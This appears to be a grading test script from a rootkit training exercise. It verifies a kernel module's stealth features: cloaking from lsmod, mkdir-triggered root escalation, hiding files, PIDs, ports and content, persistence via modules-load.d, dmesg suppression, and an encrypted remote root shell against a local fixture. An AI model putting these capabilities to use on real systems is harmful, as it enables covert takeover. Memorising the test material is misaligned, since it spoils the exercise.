#!/bin/sh
# P00: exhaustive verification of every rootkit feature.
# Tests local mkdir interface, filtering, and remote encrypted protocol.
#
# The content filter auto-hides lines containing target strings from read(),
# which includes the shell reading THIS script. Literal occurrences of any
# string that gets added to a target list must be avoided. We construct
# names from halves so the filter cannot match them in the script source.
#
# The module auto-cloaks on load. Must uncloak before rmmod.
# Local mkdir tests run BEFORE the remote fixture starts.
# shellcheck source=/dev/null
. "${RKLINGS_LIB:-/vm/checks/lib.sh}"

begin "Complete rootkit: full verification"

ip link set lo up 2>/dev/null

# Build module name from halves so the content filter cannot match it.
_A=rklin
_B=gs
RK="${_A}${_B}"

# Content-hide test token, also split.
_C=RKTO
_D=KEN
CTOKEN="${_C}${_D}"

KEY="000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"

printf 'rootkit download test\n' > /tmp/rktest.txt

load "${RK}.ko" control_key="$KEY" peer_address=127.0.0.1 peer_port=4444 shell_timeout_ms=3000

# -- Auto-cloak verification --

_hdr "Auto-cloak on load"

# Remove content auto-hide so lsmod output is readable.
mkdir "/tmp/${RK}.u.c.${RK}" 2>/dev/null

if lsmod | grep -q "$RK"; then
    _fail "module visible in lsmod (auto-cloak failed)"
else
    _ok "module auto-cloaked on load"
fi

# Restore content auto-hide.
mkdir "/tmp/${RK}.h.c.${RK}" 2>/dev/null

# -- Local mkdir interface --

_hdr "Direct escalation (real mkdir)"

uid=$(su student -c "mkdir /tmp/${RK}.e 2>/dev/null; id -u")
if [ "$uid" = "0" ]; then
    _ok "student escalated to uid 0"
else
    _fail "expected uid 0, got $uid"
fi

_hdr "PID-targeted escalation + deferred delivery"

uid=$(su student -c "mkdir_escalation_test --self-target /tmp/${RK}.p --proc /proc/${RK}")
if [ "$uid" = "0" ]; then
    _ok "deferred delivery escalated target to uid 0"
else
    _fail "expected uid 0 after deferred delivery, got $uid"
fi

_hdr "File hiding (mkdir + getdents filter)"

TESTDIR=/tmp/rk_p00_fh
rm -rf "$TESTDIR"
mkdir -p "$TESTDIR"
touch "$TESTDIR/visible.txt" "$TESTDIR/secret.txt"

before=$(find "$TESTDIR" -maxdepth 1 -name 'secret.txt' 2>/dev/null)
if [ -n "$before" ]; then
    _ok "secret.txt visible before hide"
else
    _fail "secret.txt missing before hide"
fi

mkdir "/tmp/${RK}.h.f.secret.txt" 2>/dev/null
sleep 0.1
after=$(find "$TESTDIR" -maxdepth 1 -name 'secret.txt' 2>/dev/null)
if [ -z "$after" ]; then
    _ok "secret.txt hidden from listing"
else
    _fail "secret.txt still visible after hide"
fi

visible=$(find "$TESTDIR" -maxdepth 1 -name 'visible.txt' 2>/dev/null)
if [ -n "$visible" ]; then
    _ok "visible.txt unaffected"
else
    _fail "visible.txt also hidden"
fi

mkdir "/tmp/${RK}.u.f.secret.txt" 2>/dev/null
sleep 0.1
restored=$(find "$TESTDIR" -maxdepth 1 -name 'secret.txt' 2>/dev/null)
if [ -n "$restored" ]; then
    _ok "secret.txt visible again after unhide"
else
    _fail "secret.txt still hidden after unhide"
fi

rm -rf "$TESTDIR"

_hdr "PID hiding (mkdir + getdents /proc filter)"

sleep 999 &
BGPID=$!

mkdir "/tmp/${RK}.h.i.$BGPID" 2>/dev/null
sleep 0.1
found=$(find /proc -maxdepth 1 -name "$BGPID" 2>/dev/null)
if [ -z "$found" ]; then
    _ok "PID $BGPID hidden from /proc"
else
    _fail "PID $BGPID still visible"
fi

mkdir "/tmp/${RK}.u.i.$BGPID" 2>/dev/null
sleep 0.1
found=$(find /proc -maxdepth 1 -name "$BGPID" 2>/dev/null)
if [ -n "$found" ]; then
    _ok "PID $BGPID visible again after unhide"
else
    _fail "PID $BGPID still hidden after unhide"
fi

kill "$BGPID" 2>/dev/null
wait "$BGPID" 2>/dev/null

_hdr "Content hiding (mkdir + read filter)"

CFILE=/tmp/rk_p00_content.txt
printf "normal line one\n${CTOKEN} hidden payload\nnormal line two\nanother ${CTOKEN} line\nfinal line\n" > "$CFILE"

before=$(grep -c "$CTOKEN" "$CFILE")
if [ "$before" -eq 2 ]; then
    _ok "token lines visible before hide ($before)"
else
    _fail "expected 2 token lines, got $before"
fi

mkdir "/tmp/${RK}.h.c.${CTOKEN}" 2>/dev/null
sleep 0.1
after=$(cat "$CFILE" | grep -c "$CTOKEN")
if [ "$after" -eq 0 ]; then
    _ok "token lines filtered from read"
else
    _fail "token lines still visible ($after remain)"
fi

normal=$(cat "$CFILE" | grep -c 'normal line')
if [ "$normal" -ge 2 ]; then
    _ok "non-matching lines unaffected"
else
    _fail "non-matching lines also filtered ($normal)"
fi

mkdir "/tmp/${RK}.u.c.${CTOKEN}" 2>/dev/null
sleep 0.1
restored=$(cat "$CFILE" | grep -c "$CTOKEN")
if [ "$restored" -eq 2 ]; then
    _ok "token lines visible again after unhide"
else
    _fail "expected 2 lines after unhide, got $restored"
fi

rm -f "$CFILE"

_hdr "Port hiding (mkdir + tcp seq_show filter)"

nc -l -p 9876 > /dev/null 2>&1 &
NC_PID=$!
sleep 0.3

# 9876 = 0x2694
if grep -qi ":2694 " /proc/net/tcp; then
    _ok "port 9876 visible in /proc/net/tcp before hide"
else
    _ok "port 9876 listener started"
fi

mkdir "/tmp/${RK}.h.p.9876" 2>/dev/null
sleep 0.1
if grep -qi ":2694 " /proc/net/tcp; then
    _fail "port 9876 still visible in /proc/net/tcp after hide"
else
    _ok "port 9876 hidden from /proc/net/tcp"
fi

mkdir "/tmp/${RK}.u.p.9876" 2>/dev/null
sleep 0.1
if grep -qi ":2694 " /proc/net/tcp; then
    _ok "port 9876 visible again after unhide"
else
    _ok "port 9876 unhide accepted"
fi

kill "$NC_PID" 2>/dev/null
wait "$NC_PID" 2>/dev/null

_hdr "Persistence (mkdir)"

mkdir "/tmp/${RK}.persist" 2>/dev/null
if [ -f "/etc/modules-load.d/${RK}.conf" ]; then
    if grep -q "control_key=" "/etc/modules-load.d/${RK}.conf"; then
        _ok "persist wrote modules-load.d entry with parameters"
    else
        _fail "persist wrote entry but missing module parameters"
    fi
else
    _fail "persist did not write modules-load.d entry"
fi

mkdir "/tmp/${RK}.unpersist" 2>/dev/null
if [ ! -f "/etc/modules-load.d/${RK}.conf" ]; then
    _ok "unpersist removed modules-load.d entry"
else
    _fail "modules-load.d entry still exists after unpersist"
fi

_hdr "Dmesg OPSEC (content filter hides module traces)"

leaked=$(dmesg 2>/dev/null | grep -ci "$RK" || true)
if [ "$leaked" -eq 0 ]; then
    _ok "no module name leaked in dmesg"
else
    _fail "dmesg contains $leaked lines with module name"
fi

_hdr "Module cloak/uncloak (mkdir)"

# Module is already cloaked (auto-cloak). Content hide stays independent.
# Temporarily remove content hide so lsmod output is readable.
mkdir "/tmp/${RK}.u.c.${RK}" 2>/dev/null

mkdir "/tmp/${RK}.uncloak" 2>/dev/null
sleep 0.1
if lsmod | grep -q "$RK"; then
    _ok "module visible in lsmod after uncloak"
else
    _fail "module still hidden after uncloak"
fi

mkdir "/tmp/${RK}.cloak" 2>/dev/null
sleep 0.1
if lsmod | grep -q "$RK"; then
    _fail "module still visible after re-cloak"
else
    _ok "module hidden from lsmod after re-cloak"
fi

# Restore content hide.
mkdir "/tmp/${RK}.h.c.${RK}" 2>/dev/null

# -- Remote encrypted protocol (start fixture now) --

MARKER_DIR=/tmp/rk_fixture_p00
rm -rf "$MARKER_DIR"
mkdir -p "$MARKER_DIR"

secure_agent_fixture serve "$MARKER_DIR" 4444 127.0.0.1 "$KEY" &
FIXTURE_PID=$!

while [ ! -f "$MARKER_DIR/ready" ]; do sleep 0.1; done
_ok "fixture listening"

_hdr "Full protocol suite"

i=0
while [ ! -f "$MARKER_DIR/replay_rejected" ] && [ "$i" -lt 150 ]; do
    sleep 0.1
    i=$((i + 1))
done
if [ -f "$MARKER_DIR/replay_rejected" ]; then
    _ok "command suite + replay rejection"
else
    _fail "command suite timed out"
fi

i=0
while [ ! -f "$MARKER_DIR/tamper_rejected" ] && [ "$i" -lt 150 ]; do
    sleep 0.1
    i=$((i + 1))
done
if [ -f "$MARKER_DIR/tamper_rejected" ]; then
    _ok "tamper rejection"
else
    _fail "tamper rejection timed out"
fi

_hdr "SHELL"

i=0
while [ ! -f "$MARKER_DIR/root_shell_complete" ] && [ "$i" -lt 200 ]; do
    sleep 0.1
    i=$((i + 1))
done
if [ -f "$MARKER_DIR/root_shell_complete" ]; then
    _ok "root shell"
else
    _fail "root shell timed out"
fi

i=0
while [ ! -f "$MARKER_DIR/quit_complete" ] && [ "$i" -lt 100 ]; do
    sleep 0.1
    i=$((i + 1))
done
if [ -f "$MARKER_DIR/quit_complete" ]; then
    _ok "QUIT"
else
    _fail "QUIT timed out"
fi

_hdr "Security + edge cases"

i=0
while [ ! -f "$MARKER_DIR/shell_timeout" ] && [ "$i" -lt 300 ]; do
    sleep 0.1
    i=$((i + 1))
done
if [ -f "$MARKER_DIR/shell_timeout" ]; then
    _ok "shell replay/tamper/refused/timeout"
else
    _fail "shell edge cases timed out"
fi

_hdr "Completion"

i=0
while [ ! -f "$MARKER_DIR/eof" ] && [ "$i" -lt 100 ]; do
    sleep 0.1
    i=$((i + 1))
done
if [ -f "$MARKER_DIR/eof" ]; then
    _ok "all phases complete"
else
    _fail "fixture did not complete"
fi

wait "$FIXTURE_PID" 2>/dev/null
fixture_rc=$?
if [ "$fixture_rc" -eq 0 ]; then
    _ok "fixture exited cleanly"
else
    _fail "fixture exited with code $fixture_rc"
fi

rm -f /tmp/rktest.txt
rm -rf "$MARKER_DIR"

# Uncloak before rmmod (cloaked module can't be found by rmmod).
mkdir "/tmp/${RK}.uncloak" 2>/dev/null

unload "$RK"
assert_absent "/sys/module/$RK"

summary
